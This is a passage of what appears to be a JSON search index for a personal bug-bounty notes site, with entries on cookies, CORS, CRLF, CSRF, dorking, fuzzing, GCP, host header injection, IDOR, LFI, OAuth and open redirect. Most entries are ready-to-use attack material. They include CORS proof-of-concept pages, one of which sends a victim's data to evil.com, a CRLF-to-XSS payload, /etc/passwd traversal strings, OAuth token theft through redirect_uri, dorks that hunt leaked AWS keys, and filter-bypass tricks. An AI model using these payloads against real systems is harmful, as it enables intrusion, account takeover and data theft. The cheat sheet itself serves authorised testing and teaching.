PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout Decoding the cookie If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users\nSession fixation An attacker tricks the victim into using a cookie that has an identifier know to the attacker\nSession donation The attacker sends his own session to the victim. The victim will see that he is already logged and will suppose that he is inside his own account but the actions will be performed inside the attackers account\n","description":"Cookies Explained https://cookiepedia.co.uk/\nAttacks Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout Decoding the cookie If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users"},{"id":24,"href":"/exploitation/vulnerability/cors/","title":"CORS","parent":"Exploitations","content":"# https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC Simple \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;CORS PoC Exploit\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;h1\u0026gt;CORS Exploit\u0026lt;br\u0026gt;six2dez\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div id=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;cors()\u0026#34;\u0026gt;Exploit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 \u0026amp;\u0026amp; this.status == 200) { document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://\u0026lt;vulnerable-url\u0026gt;\u0026#34;, true); xhttp.withCredentials = true; xhttp.send(); } \u0026lt;/script\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Simple with headers \u0026lt;html\u0026gt; \u0026lt;script\u0026gt; var http = new XMLHttpRequest(); var url = \u0026#39;Url\u0026#39;;//Paste here Url var params = \u0026#39;PostData\u0026#39;;//Paste here POST data http.open(\u0026#39;POST\u0026#39;, url, true); //Send the proper header information along with the request http.setRequestHeader(\u0026#39;Content-type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;); http.onreadystatechange = function() {//Call a function when the state changes. if(http.readyState == 4 \u0026amp;\u0026amp; http.status == 200) { alert(http.responseText); } } http.send(params); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Data leakage \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button type=\u0026#39;button\u0026#39; onclick=\u0026#39;cors()\u0026#39;\u0026gt;CORS\u0026lt;/button\u0026gt; \u0026lt;p id=\u0026#39;corspoc\u0026#39;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 \u0026amp;\u0026amp; this.status == 200) { var a = this.responseText; // Sensitive data from target1337.com about user account document.getElementById(\u0026#34;corspoc\u0026#34;).innerHTML = a; xhttp.open(\u0026#34;POST\u0026#34;, \u0026#34;https://evil.com\u0026#34;, true);// Sending that data to Attacker\u0026#39;s website xhttp.withCredentials = true; console.log(a); xhttp.send(\u0026#34;data=\u0026#34;+a); } }; xhttp.open(\u0026#34;POST\u0026#34;, \u0026#34;https://target1337.com\u0026#34;, true); xhttp.withCredentials = true; var body = \u0026#34;requestcontent\u0026#34;; var aBody = new Uint8Array(body.length); for (var i = 0; i \u0026lt; aBody.length; i++) aBody[i] = body.charCodeAt(i); xhttp.send(new Blob([aBody])); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JSONP \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;JSONP PoC\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;h1\u0026gt;JSONP Exploit\u0026lt;br\u0026gt;YourTitle\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div id=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;trigger()\u0026#34;\u0026gt;Exploit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; function testjsonp(myObj) { var result = JSON.stringify(myObj) document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = result; //console.log(myObj) } \u0026lt;/script\u0026gt; \u0026lt;script \u0026gt; function trigger() { var s = document.createElement(\u0026#34;script\u0026#34;); s.src = \u0026#34;https://\u0026lt;vulnerable-endpoint\u0026gt;?callback=testjsonp\u0026#34;; document.body.appendChild(s); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","description":"# https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC Simple \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;CORS PoC Exploit\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;h1\u0026gt;CORS Exploit\u0026lt;br\u0026gt;six2dez\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div id=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;cors()\u0026#34;\u0026gt;Exploit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 \u0026amp;\u0026amp; this.status == 200) { document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://\u0026lt;vulnerable-url\u0026gt;\u0026#34;, true); xhttp.withCredentials = true; xhttp.send(); } \u0026lt;/script\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Simple with headers \u0026lt;html\u0026gt; \u0026lt;script\u0026gt; var http = new XMLHttpRequest(); var url = \u0026#39;Url\u0026#39;;//Paste here Url var params = \u0026#39;PostData\u0026#39;;//Paste here POST data http."},{"id":25,"href":"/exploitation/vulnerability/crlf/","title":"CRLF","parent":"Exploitations","content":"Carriage Return Line Feed\nCarriage Return = ASCII 13, \\r, %0D Line Feed = ASCII 10, \\n, %0A Tools # https://github.com/dwisiswant0/crlfuzz crlfuzz -u \u0026#34;http://example.com\u0026#34; POC CRLF to XSS\nhttp://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E ","description":"Carriage Return Line Feed\nCarriage Return = ASCII 13, \\r, %0D Line Feed = ASCII 10, \\n, %0A Tools # https://github.com/dwisiswant0/crlfuzz crlfuzz -u \u0026#34;http://example.com\u0026#34; POC CRLF to XSS\nhttp://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E "},{"id":26,"href":"/exploitation/vulnerability/csrf/","title":"CSRF","parent":"Exploitations","content":" Conditions to exploit an useful CSRF Revelant action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters How to find Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request and call manually Extract the token with XSS or HTML injection Articles URL Description What is CRSF Part #1 Why CORS makes CSRf impossible Part #2 Generate POCs In burp, click in request \u0026gt; engagement tools \u0026gt; generate CSRF poc URL Description https://pentestbook.six2dez.com/enumeration/web/csrf CSRF POCs Mindmap ","description":"Conditions to exploit an useful CSRF Revelant action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters How to find Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request and call manually Extract the token with XSS or HTML injection Articles URL Description What is CRSF Part #1 Why CORS makes CSRf impossible Part #2 Generate POCs In burp, click in request \u0026gt; engagement tools \u0026gt; generate CSRF poc URL Description https://pentestbook."},{"id":27,"href":"/exploitation/vulnerability/deserialization/","title":"Deserialization","parent":"Exploitations","content":" Java https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class ","description":" Java https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class "},{"id":28,"href":"/recon/dorks/","title":"Dorks","parent":"Recons","content":" Google # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks site:npmjs.com \u0026#34;company\u0026#34; site:npm.runkit.com \u0026#34;company\u0026#34; site:pastebin.com \u0026#34;company\u0026#34; site:productforums.google.com \u0026#34;company\u0026#34; site:bitbucket.org \u0026#34;company\u0026#34; site:*.atlassian.net \u0026#34;company\u0026#34; site:trello.com \u0026#34;company\u0026#34; site:prezi.com \u0026#34;company\u0026#34; inurl:gitlab.com \u0026#34;company\u0026#34; Github #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks org:company \u0026#34;firebase\u0026#34; org:company \u0026#34;password\u0026#34; org:company \u0026#34;bucket_name\u0026#34; org:company \u0026#34;aws_access_key\u0026#34; org:company \u0026#34;aws_secret_key\u0026#34; org:company \u0026#34;S3_BUCKET\u0026#34; org:company \u0026#34;S3_ACCESS_KEY_ID\u0026#34; org:company \u0026#34;S3_SECRET_ACCESS_KEY\u0026#34; org:company \u0026#34;S3_ENDPOINT\u0026#34; org:company \u0026#34;AWS_ACCESS_KEY_ID\u0026#34; org:company \u0026#34;list_aws_accounts\u0026#34; https://gist.github.com/win3zz/0a1c70589fcbea64dba4588b93095855\n","description":"Google # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks site:npmjs.com \u0026#34;company\u0026#34; site:npm.runkit.com \u0026#34;company\u0026#34; site:pastebin.com \u0026#34;company\u0026#34; site:productforums.google.com \u0026#34;company\u0026#34; site:bitbucket.org \u0026#34;company\u0026#34; site:*.atlassian.net \u0026#34;company\u0026#34; site:trello.com \u0026#34;company\u0026#34; site:prezi.com \u0026#34;company\u0026#34; inurl:gitlab.com \u0026#34;company\u0026#34; Github #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks org:company \u0026#34;firebase\u0026#34; org:company \u0026#34;password\u0026#34; org:company \u0026#34;bucket_name\u0026#34; org:company \u0026#34;aws_access_key\u0026#34; org:company \u0026#34;aws_secret_key\u0026#34; org:company \u0026#34;S3_BUCKET\u0026#34; org:company \u0026#34;S3_ACCESS_KEY_ID\u0026#34; org:company \u0026#34;S3_SECRET_ACCESS_KEY\u0026#34; org:company \u0026#34;S3_ENDPOINT\u0026#34; org:company \u0026#34;AWS_ACCESS_KEY_ID\u0026#34; org:company \u0026#34;list_aws_accounts\u0026#34; https://gist."},{"id":29,"href":"/exploitation/","title":"Exploitation","parent":"Welcome to caon.io","content":"Go bananas\n","description":"Go bananas"},{"id":30,"href":"/exploitation/","title":"Exploitations","parent":"Welcome to caon.io","content":"","description":""},{"id":31,"href":"/recon/fuzzing/","title":"Fuzzing","parent":"Recons","content":" Rate Limited?\nTry to run techniques from 403 Bypass\nConfigure your options! You can customize your ffuf with special information, here\u0026rsquo;s a sample:\nhttps://gist.github.com/felipecaon/d1e7c980d7bab1312ea81df1d0241f42\n# https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u \u0026#34;https://example.com/PAYLOAD\u0026#34; -H \u0026#34;HEADER:127.0.0.1\u0026#34; -X \u0026#34;METHOD\u0026#34; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w listofurls:URL -w listofpaths:FUZZ -maxtime 300 -t 500 -c -v # Cool ffuf flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Remove noise Ffuf can generate a large output, even with -ac flag enabled. To filter dummy and extract only juicy information, it is possible to use ffufPostprocessing\n# https://github.com/Damian89/ffufPostprocessing ffufPostprocessing -result-file /tmp/ffuf/results.json -bodies-folder /tmp/ffuf/bodies/ -delete-bodies -overwrite-result-file Backup Files Tempers file to find possible backup files based in file name\n# https://github.com/mazen160/bfac bfac --no-text --url http://example.com/test.php --level 2 Recollapse Generate a bunch of breaking-strings to test your target\nhttps://github.com/0xacb/recollapse Wordlists URL Description https://github.com/p0dalirius/webapp-wordlists This repo contains wordlists for a lot of webapps https://github.com/six2dez/OneListForAll Huge list of paths and files https://www.acceis.fr/ffuf-advanced-tricks/ ffuf tricks ","description":"Rate Limited?\nTry to run techniques from 403 Bypass\nConfigure your options! You can customize your ffuf with special information, here\u0026rsquo;s a sample:\nhttps://gist.github.com/felipecaon/d1e7c980d7bab1312ea81df1d0241f42\n# https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u \u0026#34;https://example.com/PAYLOAD\u0026#34; -H \u0026#34;HEADER:127.0.0.1\u0026#34; -X \u0026#34;METHOD\u0026#34; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w listofurls:URL -w listofpaths:FUZZ -maxtime 300 -t 500 -c -v # Cool ffuf flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Remove noise Ffuf can generate a large output, even with -ac flag enabled."},{"id":32,"href":"/exploitation/cloud/gcp/","title":"Google GCP","parent":"Exploitations","content":" Google Identity Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public\nHint: deleteAccount and signUp may be gold\nDocumentation: https://developers.google.com/resources/api-libraries/documentation/identitytoolkit/v3/python/latest/identitytoolkit_v3.relyingparty.html\nMisconfigs in Google Identity POST /identitytoolkit/v3/relyingparty/signupNewUser?key=GOOGLEKEY HTTP/2 Host: www.googleapis.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 Accept: */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Client-Version: Firefox/JsCore/8.10.1/FirebaseCore-web X-Firebase-Locale: pt Content-Length: 81 {\u0026#34;returnSecureToken\u0026#34;:true,\u0026#34;email\u0026#34;:\u0026#34;asassa@asas.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;asassa@asas.com\u0026#34;} GET /v1/projects?key=GOOGLEKEY HTTP/2 Host: identitytoolkit.googleapis.com Sec-Ch-Ua: \u0026#34;Not?A_Brand\u0026#34;;v=\u0026#34;8\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;108\u0026#34;, \u0026#34;Microsoft Edge\u0026#34;;v=\u0026#34;108\u0026#34; Content-Type: application/json X-Client-Version: Chrome/JsCore/9.13.0/FirebaseCore-web Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46 X-Firebase-Locale: en Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Accept: */* Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Google Storage Check what permissions the bucket has:\nhttps://github.com/RhinoSecurityLabs/GCPBucketBrute\nIf the site ends in appspot.com, bucket can be accessed in:\nhttps://storage.googleapis.com/\u0026lt;site_url\u0026gt;\nHunting GCP Buckets Firebase Pyrebase Add a .json to the end of a firebaseio url, it may leak the database.\n","description":"Google Identity Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public\nHint: deleteAccount and signUp may be gold\nDocumentation: https://developers.google.com/resources/api-libraries/documentation/identitytoolkit/v3/python/latest/identitytoolkit_v3.relyingparty.html\nMisconfigs in Google Identity POST /identitytoolkit/v3/relyingparty/signupNewUser?key=GOOGLEKEY HTTP/2 Host: www.googleapis.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 Accept: */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Client-Version: Firefox/JsCore/8.10.1/FirebaseCore-web X-Firebase-Locale: pt Content-Length: 81 {\u0026#34;returnSecureToken\u0026#34;:true,\u0026#34;email\u0026#34;:\u0026#34;asassa@asas.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;asassa@asas.com\u0026#34;} GET /v1/projects?key=GOOGLEKEY HTTP/2 Host: identitytoolkit.googleapis.com Sec-Ch-Ua: \u0026#34;Not?"},{"id":33,"href":"/exploitation/vulnerability/hostheaderinjection/","title":"Host Header Injection","parent":"Exploitations","content":"Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.\nBusiness Logic flaws Cache poisoning Attack Vectors Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.com\nIf the attack is successful, the user will receive an email that will direct to evil.com\nHeadi # https://github.com/mlcsec/headi headi -url http://exmaple.com Common Headers https://gist.github.com/felipecaon/313a6fb6f1c5273bd61169fba920016f\n# Fake Origin - make GET request to accesible endpoint with: X-Original-URL: /admin X-Override-URL: /admin X-Rewrite-URL: /admin Referer: /admin ","description":"Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.\nBusiness Logic flaws Cache poisoning Attack Vectors Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.com\nIf the attack is successful, the user will receive an email that will direct to evil."},{"id":34,"href":"/exploitation/vulnerability/idor/","title":"IDOR","parent":"Exploitations","content":"Basically try to screw with evertything.\nBurp filter (?i)\\b\\w*id\\b(?!\\w)\\s*=\\s*(\u0026quot;[^\u0026quot;]*\u0026quot;|'[^']*'|[^\u0026amp;\\s}]*)\nAdd parameters into the endpoints GET /api_v1/messages --\u0026gt; 401 GET /api_v1/messages?user_id=victim_uuid --\u0026gt; 200 HTTP Parameter pollution GET /api_v1/messages?user_id=VICTIM_ID --\u0026gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID\u0026amp;user_id=VICTIM_ID --\u0026gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]\u0026amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: POST /api/get_profile Content-Type: application/json {“user_id”:\u0026lt;legit_id\u0026gt;,”user_id”:\u0026lt;victim’s_id\u0026gt;} Add .json to the endpoint, if it is built in Ruby! /user_data/2341 --\u0026gt; 401 Unauthorized /user_data/2341.json --\u0026gt; 200 OK Test on outdated API Versions /v3/users_data/1234 --\u0026gt; 403 Forbidden /v1/users_data/1234 --\u0026gt; 200 OK Wrap the ID with an array. {“id”:111} --\u0026gt; 401 Unauthriozied {“id”:[111]} --\u0026gt; 200 OK Wrap the ID with a JSON object: {“id”:111} --\u0026gt; 401 Unauthriozied {“id”:{“id”:111}} --\u0026gt; 200 OK Missing Function Level Access Control GET /admin/profile -\u0026gt; 401 GET /ADMIN/profile -\u0026gt; 200 Try to send a wildcard(*) instead of an ID. If it is a number id, be sure to test through a large amount of numbers, instead of just guessing If endpoint has a name like /api/users/myinfo, check for /api/admin/myinfo Replace request method with GET/POST/PUT/DELETE/PATCH Check if Referer header is used to validate requests Swap GUID with numeric ID or email Try obvious GUIDs such as 00000-0000-0000-00000 or 11111-11\u0026hellip; GUID GUID v1 can be easy exploitable\nhttps://github.com/intruder-io/guidtool https://github.com/felipecaon/uuidv1gen ","description":"Basically try to screw with evertything.\nBurp filter (?i)\\b\\w*id\\b(?!\\w)\\s*=\\s*(\u0026quot;[^\u0026quot;]*\u0026quot;|'[^']*'|[^\u0026amp;\\s}]*)\nAdd parameters into the endpoints GET /api_v1/messages --\u0026gt; 401 GET /api_v1/messages?user_id=victim_uuid --\u0026gt; 200 HTTP Parameter pollution GET /api_v1/messages?user_id=VICTIM_ID --\u0026gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID\u0026amp;user_id=VICTIM_ID --\u0026gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]\u0026amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: POST /api/get_profile Content-Type: application/json {“user_id”:\u0026lt;legit_id\u0026gt;,”user_id”:\u0026lt;victim’s_id\u0026gt;} Add .json to the endpoint, if it is built in Ruby! /user_data/2341 --\u0026gt; 401 Unauthorized /user_data/2341.json --\u0026gt; 200 OK Test on outdated API Versions /v3/users_data/1234 --\u0026gt; 403 Forbidden /v1/users_data/1234 --\u0026gt; 200 OK Wrap the ID with an array."},{"id":35,"href":"/exploitation/vulnerability/IIS/","title":"IIS","parent":"Exploitations","content":" Shortscan https://github.com/bitquark/shortscan\n$ shortscan http://example.org/ ","description":" Shortscan https://github.com/bitquark/shortscan\n$ shortscan http://example.org/ "},{"id":36,"href":"/exploitation/vulnerability/other/javascriptfiles/","title":"Javascript","parent":"Exploitations","content":" Linters JSHint Download getJS\nDownload all js files for each site https://github.com/003random/getJS\nJSScanner\nDownload all js files for each site, beautify and run linkfinder: https://github.com/dark-warlord14/JSScanner\nWay Back Machine Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.\n# https://github.com/jsvine/waybackpack # Clean known paths or JS files that are going to be useless in analysis. cat all_js_files.txt | grep -v \u0026#34;jquery\\|wp-includes\\|wp-content\\|bootstrap\u0026#34; \u0026gt;\u0026gt; js_to_download.txt cat js_to_download.txt | xargs -I@ sh -c \u0026#34;waybackpack @ -d wayback_javascripts/\u0026#34; # Feed wayback_javascripts/ folder into a secret finder Analyze Secrets # https://github.com/sdushantha/dora dora path/to/js semgrep --config \u0026#34;p/secrets\u0026#34; https://github.com/mazen160/secrets-patterns-db Links # https://github.com/xnl-h4ck3r/xnLinkFinder python3 xnLinkFinder.py -i https://example.com/1.js -o cli python3 xnLinkFinder.py -i \u0026#39;*.js\u0026#39; -o cli Sourcemaps Run map js files in unmap to get a good js file\n# https://github.com/denandz/sourcemapper ./sourcemapper -output dhubsrc -url https://hub.docker.com/public/js/client.356c14916fb23f85707f.js.map Automate JS discovery http://blog.r0b.re/hacking/pentesting/bugbounty/recon/web/js/2020/06/30/scripthunter-automated-js-discovery.html ","description":"Linters JSHint Download getJS\nDownload all js files for each site https://github.com/003random/getJS\nJSScanner\nDownload all js files for each site, beautify and run linkfinder: https://github.com/dark-warlord14/JSScanner\nWay Back Machine Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.\n# https://github.com/jsvine/waybackpack # Clean known paths or JS files that are going to be useless in analysis."},{"id":37,"href":"/exploitation/vulnerability/lfi/","title":"LFI","parent":"Exploitations","content":"# https://github.com/kurobeats/fimap fimap -u \u0026#34;https://example.com?test=\u0026#34; Wget Sometimes browsers mess around with basic directory traversal sequences, but wget may work:\nwget http://[host]/page.php?url=../../../../../../../file.html Tricks PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help Bypasses Nesting traversal sequences ....// ....\\/ ..../\\ ....\\\\ URL Encoding dot %2e forward slash %2f backslash %5c Double URL Encoding dot %252e forward slash %252f backslash %255c Null Byte Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else. A null byte terminator (%00 or 0x00 in hex) will stop processing immediately, so that any bytes following it are ignored.\nhttp://website/page=../../../etc/passwd%00 ","description":"# https://github.com/kurobeats/fimap fimap -u \u0026#34;https://example.com?test=\u0026#34; Wget Sometimes browsers mess around with basic directory traversal sequences, but wget may work:\nwget http://[host]/page.php?url=../../../../../../../file.html Tricks PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help Bypasses Nesting traversal sequences ....// ....\\/ ..../\\ ....\\\\ URL Encoding dot %2e forward slash %2f backslash %5c Double URL Encoding dot %252e forward slash %252f backslash %255c Null Byte Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else."},{"id":38,"href":"/exploitation/auth/oauth/","title":"OAuth","parent":"Exploitations","content":" Grabbing OAuth Token via redirect_uri Redirect to a controlled domain to get the access token.\nhttps://www.example.com/signin/authorize?[...]\u0026amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that \u0026ldquo;redirect_uri\u0026rdquo; can’t be pointed to an Open Redirect\nSometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:\nhttps://www.example.com/admin/oauth/authorize?[...]\u0026amp;scope=a\u0026amp;redirect_uri=https://evil.com Cross-Site Request Forgery Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (https://example.com/callback?code=AUTHORIZATION_CODE). This URL can be used in CSRF attacks.\nResources URL https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ Mindmap ","description":"Grabbing OAuth Token via redirect_uri Redirect to a controlled domain to get the access token.\nhttps://www.example.com/signin/authorize?[...]\u0026amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that \u0026ldquo;redirect_uri\u0026rdquo; can’t be pointed to an Open Redirect\nSometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:\nhttps://www.example.com/admin/oauth/authorize?[...]\u0026amp;scope=a\u0026amp;redirect_uri=https://evil.com Cross-Site Request Forgery Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable."},{"id":39,"href":"/exploitation/vulnerability/openredirect/","title":"Open Redirect","parent":"Exploitations","content":"Often a bug that brings impact when chained.\nUsing \u0026ldquo;https:\u0026rdquo; to bypass \u0026ldquo;//\u0026rdquo; blacklisted keyword\nhttps:google.com Using \u0026ldquo;//\u0026rdquo; to bypass \u0026ldquo;http\u0026rdquo; blacklisted keyword\n//google.com Using /\\/ to bypass // blacklisted keyword\n\\/\\/google.com/ /\\/google.com/ Using \u0026ldquo;/\u0026quot; to bypass:\n/\\google.com Using \u0026ldquo;%E3%80%82\u0026rdquo; to bypass \u0026ldquo;.\u0026rdquo; blacklisted character\n//google%E3%80%82com Using null byte \u0026ldquo;%00\u0026rdquo; to bypass blacklist filter\n//google%00.com Using parameter pollution\n?next=whitelisted.com\u0026amp;next=google.com Using \u0026ldquo;@\u0026rdquo; character, browser will redirect to anything after the \u0026ldquo;@\u0026rdquo;\nhttp://www.theirsite.com@yoursite.com/ Helpdesk trick Sometimes a website will redirect only to a helpdesk subdomain, this behavior is interesting because it is possible to create a custom subdomain a place a script that will redirect to an evil website. Making it a open redirect.\nOpen Redirect farming If the Applictaion have a user Sign-In/Sign-Up feature, then register a user and log in as the user. Go to your user profile page , for example : samplesite.me/accounts/profile Copy the profile page\u0026rsquo;s URL Logout and Clear all the cookies and go to the homepage of the site. Paste the Copied Profile URL on the address bar If the site prompts for a login , check the address bar , you may find the login page with a redirect parameter like the following https://samplesite.me/login?next=accounts/profile Exploit it or escalate to XSS Open Redirect uploading svg files \u0026lt;code\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;svg onload=\u0026#34;window.REMOVETHISlocation=\u0026#39;http://www.example.com\u0026#39;\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/code\u0026gt; Tools Oralyzer ","description":"Often a bug that brings impact when chained.\nUsing \u0026ldquo;https:\u0026rdquo; to bypass \u0026ldquo;//\u0026rdquo; blacklisted keyword\nhttps:google.com Using \u0026ldquo;//\u0026rdquo; to bypass \u0026ldquo;http\u0026rdquo; blacklisted keyword\n//google.com Using /\\/ to bypass // blacklisted keyword\n\\/\\/google.com/ /\\/google.com/ Using \u0026ldquo;/\u0026quot; to bypass:\n/\\google.com Using 